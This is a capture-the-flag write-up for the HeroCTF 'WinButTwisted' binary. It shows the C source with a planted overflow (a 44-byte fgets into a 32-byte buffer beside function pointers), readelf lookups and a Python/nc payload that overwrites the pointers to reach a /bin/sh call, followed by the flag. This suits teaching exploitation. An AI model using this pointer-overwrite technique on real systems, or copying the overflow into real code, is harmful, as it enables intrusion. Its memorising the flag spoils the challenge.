### Description

![image](https://user-images.githubusercontent.com/65862031/116459131-0d2a7300-a883-11eb-81e7-bcb4ba0a1679.png)

This challenge is very simple, all we need to do is find the offset as this binary is vulnerable to buffer overflow.

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int UNLOCKED = 0;

void set_lock()
{
    printf("Setting lock !");
    UNLOCKED = 1;
}

void shell()
{
    printf("In shell function ! ");
    if (UNLOCKED == 1)
    {
        printf("Getting shell ! ");
        setreuid(geteuid(), geteuid());
        system("/bin/sh");
    }

    
}

void hello_hero(int hero)
{
    printf("It looks like that's something a Hero would say\n");
}

void look_like()
{
    printf("Please keep being one. :)\n");
}

int main()
{
    int (*look)() = look_like;
    int (*hello)() = hello_hero;
    char buffer[32];

    printf("What would a hero say ?\n>>> ");
    fgets(buffer, 44, stdin);
    hello();
    look();

}
```
#### We need to call two functions, first one is set_lock() and other one is shell()
#### The vulnerable portion of this script `fgets(buffer, 44, stdin);`.The buffer size is 32 and the program is allowing upto 44 which can trigger buffer overflow attack.
#### Offset is 32 and we need address for the function set_lock() and shell(). We can get that easily using readelf command.
```
readelf -s WinButTwisted | grep set_lock
  1905: 08049965    52 FUNC    GLOBAL DEFAULT    7 set_lock
```
```
readelf -s WinButTwisted | grep shell   
  1335: 08049999   120 FUNC    GLOBAL DEFAULT    7 shell
```

`python -c "import struct;print 'A' * 32 + struct.pack('I',0x08049965) + struct.pack('I',0x08049999)" | nc pwn.heroctf.fr 9003`

![image](https://user-images.githubusercontent.com/65862031/116460767-0ac91880-a885-11eb-83cb-7ef3bd3111b9.png)

`Flag : Hero{Tw1sT3D_w1N_FuNcTi0N} `
